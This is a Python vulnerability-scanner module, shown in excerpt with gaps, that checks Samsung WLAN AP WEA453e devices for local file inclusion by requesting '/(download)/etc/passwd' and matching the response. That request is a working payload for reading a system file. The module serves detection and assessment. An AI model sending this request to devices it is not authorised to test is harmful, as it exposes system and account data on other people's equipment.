...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Samsung WLAN AP WEA453e - Local File Inclusion Detection',
        'description': 'Samsung WLAN AP WEA453e is susceptible to local file inclusion vulnerabilities.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'xss', 'samsung', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/(download)/etc/passwd', allow_redirects=False)
        ...
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Samsung WLAN AP WEA453e - Local File Inclusion detected",
